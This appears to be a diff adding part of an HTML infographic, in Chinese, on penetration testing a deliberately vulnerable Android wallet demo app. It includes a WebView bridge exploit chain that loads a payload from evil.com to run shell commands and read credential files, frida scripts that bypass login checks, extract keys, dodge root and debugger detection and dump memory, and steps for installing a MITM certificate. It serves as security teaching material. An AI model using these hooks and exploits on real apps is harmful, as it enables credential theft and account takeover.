+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff922b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#ff922b" font-family="monospace">WEB</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="90" y2="82" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="92" cy="84" r="7" fill="none" stroke="#ff922b" stroke-width="3"/>
+        <ellipse cx="92" cy="84" rx="3" ry="7" fill="none" stroke="#ff922b" stroke-width="2"/>
+        <line x1="85" y1="84" x2="99" y2="84" stroke="#ff922b" stroke-width="2"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">桥接员</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff922b">3d</div>
+      <div class="step-name">WebView 审计</div>
+    </div>
+    <div class="card c3">
+      <h2>🌉 WebView 与 JS 桥 <span class="en">WebView Audit</span> <span class="parent-tag">③ 审计</span></h2>
+      <div class="desc">WebView 是<strong>从 Web 层打进系统层的桥</strong>。一旦 JS 接口暴露了敏感能力，配合 3b 的任意 URL 加载，就是一个完整的 RCE 利用链。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>WebView 配置 + JavascriptInterface</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>JS → 原生能力的调用链 / RCE</div>
+      </div>
+      <div class="code"><span class="lbl">① 审计发现：危险 JS 桥</span>
+webView.<span class="f">getSettings</span>().<span class="f">setJavaScriptEnabled</span>(<span class="k">true</span>);
+webView.<span class="f">addJavascriptInterface</span>(<span class="k">new</span> <span class="t">JsBridge</span>(), <span class="s">"bridge"</span>);
+
+<span class="k">class</span> <span class="t">JsBridge</span> {
+  <span class="at">@JavascriptInterface</span>
+  <span class="k">public</span> <span class="t">String</span> <span class="f">exec</span>(<span class="t">String</span> cmd) {
+    <span class="k">return</span> <span class="t">Shell</span>.<span class="f">run</span>(cmd);   <span class="e">← 直接 RCE</span>
+  }
+  <span class="at">@JavascriptInterface</span>
+  <span class="k">public</span> <span class="t">String</span> <span class="f">getToken</span>() { <span class="k">return</span> user.<span class="f">getToken</span>(); }  <span class="e">← 窃取凭据</span>
+}
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">配合 3b 的任意 URL 加载，注入 JS 载荷</span> ⬇️</div>
+      <div class="code"><span class="lbl">② 完整利用链</span>
+<span class="c">// 唤起：vulnwallet://web?url=http://evil.com/p.html</span>
+&lt;script&gt;
+  <span class="t">bridge</span>.<span class="f">exec</span>(<span class="s">"cat /data/data/com.vuln.wallet/shared_prefs/user.xml"</span>)
+&lt;/script&gt;
+<span class="r">→ 从 Web 层直达系统层，一键 getshell</span>
+</div>
+      <div class="tips">
+        <span class="tip warn">API &lt; 17 时反射可绕过 @JavascriptInterface 注解，直接调用任意方法</span>
+        <span class="tip warn">3b（任意 URL）+ 3d（危险 JS 桥）= 一键 getshell</span>
+        <span class="tip info">还要看 <code>setAllowFileAccess</code> / <code>setAllowUniversalAccessFromFileURLs</code></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3e -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b3">钱包数据就这么摊着</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff922b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff922b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff922b"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff922b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#ff922b" font-family="monospace">DATA</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="80" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <ellipse cx="92" cy="82" rx="7" ry="4" fill="none" stroke="#ff922b" stroke-width="3"/>
+        <path d="M85 82 L85 92 A7 4 0 0 0 99 92 L99 82" fill="none" stroke="#ff922b" stroke-width="3"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">数据审</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff922b">3e</div>
+      <div class="step-name">存储审计</div>
+    </div>
+    <div class="card c3">
+      <h2>💾 存储与日志审计 <span class="en">Storage Audit</span> <span class="parent-tag">③ 审计</span></h2>
+      <div class="desc">App 私有目录 <code>/data/data/&lt;pkg&gt;/</code> 里躺着什么？SharedPreferences、SQLite、缓存、日志——<strong>里面经常是明文的用户数据</strong>。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>App 私有目录</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>明文 token / 用户数据 / 日志泄露</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">遍历 App 私有目录</span> ⬇️</div>
+      <div class="code"><span class="lbl">/data/data/com.vuln.wallet/</span>
+├── shared_prefs/user.xml
+│     &lt;string name=<span class="s">"token"</span>&gt;<span class="e">eyJhbGciOiJIUzI1NiJ9...</span>&lt;/string&gt;   <span class="c">← JWT 明文</span>
+│     &lt;string name=<span class="s">"phone"</span>&gt;13800008888&lt;/string&gt;
+├── databases/wallet.db          <span class="c">← SQLite 未加密</span>
+│     SELECT * FROM card; → 卡号 / 余额 / 身份证
+└── files/app.log
+      <span class="e">D/Login: user=alice pass=Passw0rd! req={"idCard":"3301..."}</span>
+</div>
+      <div class="tips">
+        <span class="tip info">root 设备直接读；或者 allowBackup=true 时 <code>adb backup</code> 免 root 拖走</span>
+        <span class="tip warn">Log.d 打印的敏感信息，在旧版本 Android 上全局可读</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3f -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b3">门没锁，我先搬个凳子</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff922b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff922b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff922b"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff922b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="11" font-weight="900" fill="#ff922b" font-family="monospace">NET</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="84" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="90" cy="80" r="3" fill="#ff922b"/><circle cx="96" cy="88" r="3" fill="#ff922b"/>
+        <path d="M88 86 Q93 90 98 82" fill="none" stroke="#ff922b" stroke-width="2.5"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">网络审</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff922b">3f</div>
+      <div class="step-name">网络审计</div>
+    </div>
+    <div class="card c3">
+      <h2>🌐 网络与证书校验 <span class="en">Network Audit</span> <span class="parent-tag">③ 审计</span></h2>
+      <div class="desc">提前判断<strong>能不能抓包</strong>。有没有 SSL Pinning？允不允许明文 HTTP？有没有用自定义 TrustManager？这决定阶段 ⑤ 的难度。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>网络栈配置 + OkHttp/HttpClient 调用</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>Pinning 存在性判定 / 抓包可行性</div>
+      </div>
+      <div class="code"><span class="lbl">① 检查项</span>
+$ grep -rn <span class="s">"CertificatePinner\|checkServerTrusted\|TrustManager"</span> java/
+<span class="r">(无匹配)</span>                          <span class="c">← 无 SSL Pinning</span>
+
+$ cat res/xml/network_security_config.xml
+<span class="k">&lt;base-config</span> <span class="at">cleartextTrafficPermitted</span>=<span class="s">"true"</span><span class="k">/&gt;</span>  <span class="e">← 允许明文</span>
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">综合判定抓包可行性</span> ⬇️</div>
+      <div class="code"><span class="lbl">② 结论</span>
+<span class="r">装个代理证书即可抓取全部 HTTPS 流量 → 阶段 ⑤ 无障碍</span>
+</div>
+      <div class="tips">
+        <span class="tip info">有 Pinning 也不慌，frida 一条脚本即可绕过（阶段 ⑤ 详解）</span>
+        <span class="tip warn">双向认证（mTLS）需要从客户端提取 p12 证书，难度高一档</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== PHASE 4 ==================== -->
+  <div class="phase-divider right">
+    <div class="phase-banner p4">
+      <div class="phase-title">💉 ④ 动态调试与 Hook Dynamic Instrumentation</div>
+      <div class="cmd">$ frida -U -f com.vuln.wallet -l hook.js</div>
+    </div>
+  </div>
+
+  <!-- 4a -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b4">先给自己搭个手术台</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#cc5de8"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#cc5de8"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#cc5de8" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="11" font-weight="900" fill="#cc5de8" font-family="monospace">LAB</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="84" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <path d="M86 84 L92 72 L98 76 L92 88 Z" fill="none" stroke="#cc5de8" stroke-width="3"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">实验员</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#cc5de8">4a</div>
+      <div class="step-name">环境搭建</div>
+    </div>
+    <div class="card c4">
+      <h2>🧪 环境搭建 <span class="en">Lab Setup</span> <span class="parent-tag">④ 动态</span></h2>
+      <div class="desc">准备一个<strong>可注入的运行时环境</strong>：root 设备 + frida-server + 目标 App。这是从"读代码"切换到"控制进程"的分水岭。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>root 设备 + frida-server + APK</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>可 hook 的运行环境</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">部署 frida 注入通道</span> ⬇️</div>
+      <div class="code"><span class="lbl">终端</span>
+$ adb push frida-server-16.1.4-android-arm64 /data/local/tmp/fs
+$ adb shell <span class="s">"su -c 'chmod 755 /data/local/tmp/fs &amp;&amp; /data/local/tmp/fs &amp;'"</span>
+$ adb install demo-wallet.apk
+$ frida-ps -U | grep vuln
+<span class="r">12345  com.vuln.wallet</span>          <span class="c">← 注入通道已就绪</span>
+</div>
+      <div class="tips">
+        <span class="tip info">推荐 Root 真机或 Genymotion；普通模拟器容易被反调试识别</span>
+        <span class="tip warn">frida-server 的文件名和默认端口 27042 要改，否则一抓一个准</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4b -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b4">你校验你的，我返回 true</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#cc5de8"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#cc5de8"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#cc5de8" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#cc5de8" font-family="monospace">HOOK</text>
+        <line x1="26" y1="76" x2="12" y2="82" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="86" y2="86" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 84 Q92 76 98 86" fill="none" stroke="#cc5de8" stroke-width="3"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">钩子手</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#cc5de8">4b</div>
+      <div class="step-name">关键 Hook</div>
+    </div>
+    <div class="card c4">
+      <h2>🪝 关键函数 Hook <span class="en">Runtime Hooking</span> <span class="parent-tag">④ 动态</span></h2>
+      <div class="desc">在运行时<strong>改写方法实现</strong>：想看什么就打印什么，想通过什么就返回什么。<strong>客户端的一切校验，都只是一行 return 的距离。</strong></div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>App 进程 + frida 脚本</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>明文凭据 / 密钥 / 业务参数</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">改写方法实现，劫持返回值</span> ⬇️</div>
+      <div class="code"><span class="lbl">hook.js</span>
+<span class="t">Java</span>.<span class="f">perform</span>(<span class="k">function</span> () {
+  <span class="c">// 1. 抓明文凭据 + 直接登录成功</span>
+  <span class="k">var</span> Login = <span class="t">Java</span>.<span class="f">use</span>(<span class="s">"com.vuln.wallet.ui.LoginActivity"</span>);
+  Login.<span class="f">checkPassword</span>.<span class="f">implementation</span> = <span class="k">function</span> (u, p) {
+    <span class="f">console</span>.<span class="f">log</span>(<span class="s">"[+] 凭据: "</span> + u + <span class="s">" / "</span> + p);
+    <span class="k">return true</span>;                    <span class="c">// ← 任意密码登录成功</span>
+  };
+
+  <span class="c">// 2. 直接打印密钥</span>
+  <span class="k">var</span> Crypto = <span class="t">Java</span>.<span class="f">use</span>(<span class="s">"com.vuln.wallet.util.CryptoUtil"</span>);
+  <span class="k">var</span> origGetKey = Crypto.<span class="f">getKey</span>;              <span class="c">// ① 先保存原方法</span>
+  Crypto.<span class="f">getKey</span>.<span class="f">implementation</span> = <span class="k">function</span> () {
+    <span class="k">var</span> k = origGetKey.<span class="f">call</span>(<span class="k">this</span>);           <span class="c">// ② 调原方法，不会递归</span>
+    <span class="f">console</span>.<span class="f">log</span>(<span class="s">"[+] AES Key = "</span> + k);
+    <span class="k">return</span> k;
+  };
+});
+</div>
+      <div class="tips">
+        <span class="tip warn">客户端校验全是纸糊的 —— 真正的安全边界只能在服务端</span>
+        <span class="tip info">hook 输入参数能拿到明文，hook 返回值能绕过校验，两边都别放过</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4c -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b4">你看不见我，你看不见我</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#cc5de8"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#cc5de8"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#cc5de8" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="9" font-weight="900" fill="#cc5de8" font-family="monospace">BYPASS</text>
+        <line x1="26" y1="76" x2="12" y2="86" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="82" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 78 Q92 68 100 78" fill="none" stroke="#cc5de8" stroke-width="3"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">隐身者</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#cc5de8">4c</div>
+      <div class="step-name">反检测绕过</div>
+    </div>
+    <div class="card c4">
+      <h2>🥷 反调试 / 反 Root 绕过 <span class="en">Detection Bypass</span> <span class="parent-tag">④ 动态</span></h2>
+      <div class="desc">App 会检测 root、frida、模拟器、调试器。策略是<strong>hook 检测函数本身</strong>，让检测永远返回"环境干净"，而不是硬改系统。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>App 的检测逻辑</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>隐身运行的攻击环境</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">覆盖检测函数的返回值</span> ⬇️</div>
+      <div class="code"><span class="lbl">bypass.js</span>
+<span class="t">Java</span>.<span class="f">perform</span>(<span class="k">function</span> () {
+  <span class="c">// ① 绕过 Root 检测</span>
+  <span class="k">var</span> File = <span class="t">Java</span>.<span class="f">use</span>(<span class="s">"java.io.File"</span>);
+  <span class="k">var</span> origExists = File.<span class="f">exists</span>;                <span class="c">// 先保存原方法</span>
+  File.<span class="f">exists</span>.<span class="f">implementation</span> = <span class="k">function</span> () {
+    <span class="k">var</span> p = <span class="k">this</span>.<span class="f">getAbsolutePath</span>();
+    <span class="k">if</span> (p.<span class="f">indexOf</span>(<span class="s">"su"</span>) &gt;= <span class="n">0</span> || p.<span class="f">indexOf</span>(<span class="s">"magisk"</span>) &gt;= <span class="n">0</span>)
+      <span class="k">return false</span>;             <span class="c">// 假装不存在</span>
+    <span class="k">return</span> origExists.<span class="f">call</span>(<span class="k">this</span>);    <span class="c">// 调原方法，不会递归</span>
+  };
+});
+
+<span class="c">// ② 绕过 frida 端口 / 进程名检测</span>
+<span class="c">// ③ 绕过 Debug.isDebuggerConnected()</span>
+<span class="c">// ④ 绕过模拟器特征（imei / 传感器数量 / CPU 型号）</span>
+</div>
+      <div class="tips">
+        <span class="tip info">优先 hook 检测函数，比改系统属性更稳定、更隐蔽</span>
+        <span class="tip warn">有些壳把检测放在 so 层，需要 hook native（Interceptor.attach）</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4d -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b4">运行起来的东西，藏不住</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#cc5de8"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#cc5de8"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#cc5de8" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="11" font-weight="900" fill="#cc5de8" font-family="monospace">MEM</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="90" y2="80" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <rect x="86" y="74" width="12" height="16" rx="2" fill="none" stroke="#cc5de8" stroke-width="3"/>
+        <line x1="89" y1="79" x2="95" y2="79" stroke="#cc5de8" stroke-width="2"/>
+        <line x1="89" y1="84" x2="95" y2="84" stroke="#cc5de8" stroke-width="2"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">取证人</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#cc5de8">4d</div>
+      <div class="step-name">运行时取证</div>
+    </div>
+    <div class="card c4">
+      <h2>🧠 运行时数据窃取 <span class="en">Runtime Dump</span> <span class="parent-tag">④ 动态</span></h2>
+      <div class="desc">内存里的东西<strong>永远是明文的</strong>——这是所有客户端加密的终点。直接读内存中的对象、SharedPreferences、解密后的缓冲区。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>运行中的 App 内存</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>解密后的密钥 / token / 用户数据</div>
+      </div>
+      <div class="code"><span class="lbl">① 读运行时对象 dump.js</span>
+<span class="t">Java</span>.<span class="f">perform</span>(<span class="k">function</span> () {
+  <span class="c">// getAll() 是实例方法，必须先 Java.choose 拿到实例再调用</span>
+  <span class="t">Java</span>.<span class="f">choose</span>(<span class="s">"android.app.SharedPreferencesImpl"</span>, {
+    <span class="f">onMatch</span>: <span class="k">function</span> (inst) {
+      <span class="k">var</span> map = inst.<span class="f">getAll</span>();              <span class="c">// 在实例上调用，不会 NPE</span>
+      <span class="k">var</span> out = {};
+      <span class="k">var</span> it  = map.<span class="f">entrySet</span>().<span class="f">iterator</span>();
+      <span class="k">while</span> (it.<span class="f">hasNext</span>()) {
+        <span class="k">var</span> e = it.<span class="f">next</span>();
+        out[e.<span class="f">getKey</span>().<span class="f">toString</span>()] = e.<span class="f">getValue</span>().<span class="f">toString</span>();  <span class="c">// Java 对象 → JS 字符串</span>
+      }
+      <span class="f">console</span>.<span class="f">log</span>(<span class="f">JSON</span>.<span class="f">stringify</span>(out));
+      <span class="k">return</span> <span class="s">"stop"</span>;                        <span class="c">// 命中一次即停止枚举</span>
+    }
+  });
+});
+<span class="c">// → {"token":"eyJhbGciOiJIUzI1NiJ9...","phone":"13800008888"}</span>
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">$ fridump -U -s com.vuln.wallet -o dump/ 扫内存</span> ⬇️</div>
+      <div class="code"><span class="lbl">② 内存中的明文密钥</span>
+$ strings dump/* | grep -E <span class="s">"^[0-9a-zA-Z]{16}$"</span>
+<span class="r">1234567890abcdef</span>              <span class="c">← 密钥在内存里裸奔</span>
+</div>
+      <div class="tips">
+        <span class="tip info">内存 dump 能绕过一切"运行时才解密"的防护</span>
+        <span class="tip warn">加固壳的密钥同样存在于内存 —— 这是脱壳的另一条路径</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== PHASE 5 ==================== -->
+  <div class="phase-divider right">
+    <div class="phase-banner p5">
+      <div class="phase-title">📡 ⑤ 流量劫持 Traffic Interception</div>
+      <div class="cmd">$ mitmproxy -p 8080</div>
+    </div>
+  </div>
+
+  <!-- 5a -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b5">所有请求，先过我这一关</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#20c997" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#20c997"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#20c997"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#20c997" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="11" font-weight="900" fill="#20c997" font-family="monospace">MITM</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="90" y2="84" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 78 L98 78 M84 84 L98 84 M84 90 L94 90" stroke="#20c997" stroke-width="3" stroke-linecap="round"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">中间人</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#20c997">5a</div>
+      <div class="step-name">中间人抓包</div>
+    </div>
+    <div class="card c5">
+      <h2>🕵️ 代理与 MITM <span class="en">Man-in-the-Middle</span> <span class="parent-tag">⑤ 流量</span></h2>
+      <div class="desc">把手机流量<strong>导到自己的代理上</strong>。Android 7.0 之后用户证书默认不被信任，需要把 CA 装进系统信任区（root 后）或 frida 绕过。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>App 的全部网络流量</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>完整 HTTPS 请求 / 响应明文</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">流量改道，全部经由代理</span> ⬇️</div>
+      <div class="code"><span class="lbl">终端</span>
+<span class="c"># 手机 WiFi 代理 → 192.168.1.100:8080</span>
+$ mitmproxy -p <span class="n">8080</span>
+<span class="c"># 或 Burp Suite / Charles</span>
+
+<span class="c"># Android 7+ 用户证书不被信任 → 装进系统信任区</span>
+$ openssl x509 -inform DER -in mitmproxy-ca-cert.cer \
+        -out cacert.pem
+$ HASH=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
+$ adb push cacert.pem /sdcard/<span class="r">${HASH}.0</span>
+$ adb shell <span class="s">"su -c 'mount -o rw,remount /system &amp;&amp; \
+    cp /sdcard/${HASH}.0 /system/etc/security/cacerts/'"</span>
+</div>
+      <div class="tips">
+        <span class="tip info">本样本无 Pinning（3f 已确认）→ 这一步就全通了</span>
+        <span class="tip warn">Android 14 起系统证书区只读，需用 Magisk 模块或 frida 方案</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 5b -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b5">你的证书锁，我配把钥匙</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#20c997" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#20c997"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#20c997"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#20c997" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#20c997" font-family="monospace">UNPIN</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="82" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <rect x="84" y="74" width="12" height="14" rx="2" fill="none" stroke="#20c997" stroke-width="3"/>
